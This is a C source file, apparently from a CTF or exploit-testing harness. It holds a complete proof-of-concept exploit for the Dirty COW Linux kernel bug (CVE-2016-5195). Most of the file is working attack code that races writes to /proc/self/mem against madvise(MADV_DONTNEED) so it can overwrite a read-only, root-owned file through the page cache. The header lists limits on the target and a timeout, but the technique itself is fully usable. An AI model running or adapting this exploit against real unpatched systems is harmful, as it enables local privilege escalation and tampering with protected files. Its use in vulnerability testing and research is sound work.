/**
 * CVE-2016-5195 PoC - CTF Challenge Mode (Dirty COW)
 *
 * Race condition in mm/gup.c copy-on-write handling
 *
 * Vulnerability Description:
 *   Linux kernel 2.6.22 through 4.8.3 has a local privilege escalation
 *   vulnerability in the mm/gup.c copy-on-write (COW) handling. The kernel
 *   fails to properly handle race conditions between page faults and
 *   madvise(MADV_DONTNEED), allowing an attacker to write to read-only
 *   memory mappings. The attack uses /proc/self/mem to race against
 *   MADV_DONTNEED, causing the kernel to write directly to the page cache
 *   instead of a COW copy.
 *
 *   Fixed in kernel 4.8.3 (commit 19be0eaffa3ac7d8eb6784ad9bdbc7d6).
 *
 * CTF Modes:
 *   read_root_file  - Unsupported (Dirty COW is a write-oriented vulnerability;
 *                     it doesn't provide an information leak or read oracle)
 *   write_root_file - Supported (page cache pollution via COW race)
 *
 * Exploitation approach:
 *   This is a page cache pollution attack via COW race condition:
 *   1. mmap() a read-only file with MAP_PRIVATE
 *   2. Start two threads racing:
 *      a) Thread 1: Write to the mapping via /proc/self/mem
 *      b) Thread 2: madvise(MADV_DONTNEED) to discard the COW page
 *   3. The race causes the kernel to write directly to the page cache
 *   4. The dirty page is written back to disk, modifying the original file
 *
 * Safety:
 *   - Only writes to the file specified via --root-file
 *   - Does NOT modify system files (/etc/passwd, etc.)
 *   - alarm(10) forced timeout
 *   - No fork/exec of shell commands
 *
 * Build:
 *   gcc -O2 -Wall -static -I common -DPOC_NO_SYSTEM_MODIFY=1 \
 *       -o ../poc-bin/cve_2016_5195.bin cve_2016_5195/poc.c -lpthread
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>

/* ========================================================================
 * Constants
 * ======================================================================== */

/* Race iterations - Dirty COW needs many iterations to win the race */
#define RACE_ITERATIONS 200000

/* ========================================================================
 * Global state for race threads
 * ======================================================================== */

static char *target_map = NULL;
static size_t target_size = 0;
static volatile int stop_threads = 0;
static char *payload_data = NULL;
static size_t payload_len = 0;

/* ========================================================================
 * Thread 1: Write via /proc/self/mem (race window)
 *
 * During race condition, write bypasses COW and hits page cache directly.
 * ======================================================================== */

static void *writer_thread(void *arg) {
    (void)arg;

    int mem_fd = open("/proc/self/mem", O_RDWR);
    poc_log_syscall("open(/proc/self/mem, O_RDWR)", (long)mem_fd, errno);
    if (mem_fd < 0) {
        poc_log("Failed to open /proc/self/mem: %s", strerror(errno));
        return NULL;
    }

    for (int i = 0; i < RACE_ITERATIONS && !stop_threads; i++) {
        off_t offset = (off_t)(uintptr_t)target_map;
        if (lseek(mem_fd, offset, SEEK_SET) >= 0) {
            poc_log_syscall("lseek(mem_fd, offset, SEEK_SET)", 0, 0);
            write(mem_fd, payload_data, payload_len);
            poc_log_syscall("write(mem_fd, payload_data, payload_len)", (long)payload_len, errno);
        }
    }

    close(mem_fd);
    poc_log_syscall("close(mem_fd)", 0, 0);
    return NULL;
}

/* ========================================================================
 * Thread 2: madvise(MADV_DONTNEED) triggers page discard
 *
 * This causes kernel to re-fetch page on next access.
 * Race window can return file mapping page (not COW copy).
 * ======================================================================== */

static void *madvise_thread(void *arg) {
    (void)arg;

    for (int i = 0; i < RACE_ITERATIONS && !stop_threads; i++) {
        madvise(target_map, target_size, MADV_DONTNEED);
        poc_log_syscall("madvise(target_map, target_size, MADV_DONTNEED)", 0, errno);
    }

    return NULL;
}

/* ========================================================================
 * mode_read_root_file - CTF read_root_file mode
 *
 * CVE-2016-5195 is a write-oriented vulnerability (page cache pollution
 * via COW race condition). It does NOT provide an information leak or
 * read oracle capability. The vulnerability allows writing to read-only
 * files, not reading protected files.
 * ======================================================================== */

static int mode_read_root_file(poc_args_t *args) {
    (void)args;
    poc_log("--- CVE-2016-5195: read_root_file mode ---");

    poc_print_unsupported(POC_MODE_READ,
        "CVE-2016-5195 (Dirty COW) is a write-oriented page cache pollution "
        "vulnerability that achieves LPE via COW race condition. It does NOT "
        "provide an information leak or read oracle capability. The "
        "vulnerability allows writing to read-only files, not reading "
        "protected files");

    return 1;
}

/* ========================================================================
 * mode_write_root_file - CTF write_root_file mode
 *
 * Exploit Dirty COW to write to a root-owned file via page cache pollution.
 *
 * The target file is owned by root:root with mode 0644 (nobody can read
 * but not write). The PoC races /proc/self/mem writes against
 * MADV_DONTNEED to bypass VFS permission checks and write directly to
 * the page cache.
 * ======================================================================== */

static int mode_write_root_file(poc_args_t *args) {
    int target_fd = -1;
    int exploitable = 0;
    char read_before[4096] = {0};
    char read_after[4096] = {0};

    poc_log("--- CVE-2016-5195: write_root_file mode ---");
    poc_log("Target: %s", args->root_file);
    poc_log("CTF value: %s", args->write_value);

    /* Step 1: Read file content before exploit */
    target_fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY)", (long)target_fd, errno);
    if (target_fd < 0) {
        poc_log("Failed to open target file: %s", strerror(errno));
        poc_print_fail("Cannot open target file");
        return 1;
    }

    ssize_t n = read(target_fd, read_before, sizeof(read_before) - 1);
    poc_log_syscall("read(target_fd, read_before, len)", (long)n, errno);
    if (n < 0) {
        poc_log("Failed to read target file: %s", strerror(errno));
        close(target_fd);
        poc_log_syscall("close(target_fd)", 0, 0);
        poc_print_fail("Cannot read target file");
        return 1;
    }
    read_before[n] = '\0';
    close(target_fd);
    poc_log_syscall("close(target_fd)", 0, 0);

    printf("CTF_READ_BEFORE:%s\n", read_before);
    poc_log("Original content: %.80s...", read_before);

    /* Step 2: Prepare payload */
    payload_data = strdup(args->write_value);
    payload_len = strlen(payload_data);

    /* Step 3: mmap target file as read-only private mapping */
    target_fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY) [for mmap]", (long)target_fd, errno);
    if (target_fd < 0) {
        poc_log("Failed to open target file for mmap: %s", strerror(errno));
        free(payload_data);
        poc_print_fail("Cannot open target file for mmap");
        return 1;
    }

    struct stat st;
    if (fstat(target_fd, &st) < 0) {
        poc_log_syscall("fstat(target_fd, &st)", (long)-1, errno);
        poc_log("Failed to stat target file: %s", strerror(errno));
        close(target_fd);
        poc_log_syscall("close(target_fd)", 0, 0);
        free(payload_data);
        poc_print_fail("Cannot stat target file");
        return 1;
    }
    poc_log_syscall("fstat(target_fd, &st)", 0, 0);

    target_size = st.st_size;
    if (target_size == 0) {
        poc_log("Target file is empty, cannot mmap");
        close(target_fd);
        poc_log_syscall("close(target_fd)", 0, 0);
        free(payload_data);
        poc_print_fail("Target file is empty");
        return 1;
    }

    target_map = mmap(NULL, target_size, PROT_READ, MAP_PRIVATE, target_fd, 0);
    poc_log_syscall("mmap(NULL, target_size, PROT_READ, MAP_PRIVATE)", (long)(uintptr_t)target_map, errno);
    if (target_map == MAP_FAILED) {
        poc_log("mmap failed: %s", strerror(errno));
        close(target_fd);
        free(payload_data);
        poc_print_fail("mmap failed");
        return 1;
    }

    poc_log("File mmap'd at %p (MAP_PRIVATE, PROT_READ, size=%zu)",
            (void *)target_map, target_size);

    /* Step 4: Start race threads */
    poc_log("Starting race threads (%d iterations)...", RACE_ITERATIONS);

    pthread_t writer, adviser;
    stop_threads = 0;

    if (pthread_create(&writer, NULL, writer_thread, NULL) != 0) {
        poc_log("Failed to create writer thread: %s", strerror(errno));
        munmap(target_map, target_size);
        close(target_fd);
        free(payload_data);
        poc_print_fail("Cannot create writer thread");
        return 1;
    }

    if (pthread_create(&adviser, NULL, madvise_thread, NULL) != 0) {
        poc_log("Failed to create madvise thread: %s", strerror(errno));
        stop_threads = 1;
        pthread_join(writer, NULL);
        munmap(target_map, target_size);
        close(target_fd);
        free(payload_data);
        poc_print_fail("Cannot create madvise thread");
        return 1;
    }

    /* Wait for race completion */
    pthread_join(writer, NULL);
    pthread_join(adviser, NULL);

    munmap(target_map, target_size);
    close(target_fd);
    free(payload_data);

    stop_threads = 1;

    /* Step 5: Read file content after exploit */
    target_fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY) [post-exploit]", (long)target_fd, errno);
    if (target_fd < 0) {
        poc_log("Failed to open target file for verification: %s", strerror(errno));
        poc_print_fail("Cannot open target file for verification");
        return 1;
    }

    n = read(target_fd, read_after, sizeof(read_after) - 1);
    poc_log_syscall("read(target_fd, read_after, len)", (long)n, errno);
    if (n < 0) {
        poc_log("Failed to read target file for verification: %s", strerror(errno));
        close(target_fd);
        poc_log_syscall("close(target_fd)", 0, 0);
        poc_print_fail("Cannot read target file for verification");
        return 1;
    }
    read_after[n] = '\0';
    close(target_fd);
    poc_log_syscall("close(target_fd)", 0, 0);

    printf("CTF_READ_AFTER:%s\n", read_after);

    /* Step 6: Verify exploit success */
    if (strstr(read_after, args->write_value) != NULL) {
        poc_log("Dirty COW SUCCESS: read-only file modified!");
        poc_log("Evidence: Payload found in root-owned file");
        poc_print_flag(args->write_value);
        exploitable = 1;
    } else {
        poc_log("File content unchanged (race may not have won)");
        poc_print_fail("Race condition did not trigger vulnerability");
    }

    return exploitable ? 0 : 1;
}

/* ========================================================================
 * main
 * ======================================================================== */

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CTF arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;  /* --help was printed */
    }

    /* Initialize syscall logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2016-5195 CTF PoC ===");
    poc_log("Vuln: mm/gup.c COW race condition -> modify read-only file");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result;
    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        poc_print_unsupported(POC_MODE_UAF,
            "CVE-2016-5195 uses COW race condition page cache pollution, not UAF");
        result = 1;
    } else {
        poc_print_unsupported(args.mode, "unknown mode");
        result = 1;
    }

    poc_log_close();
    return result;
}
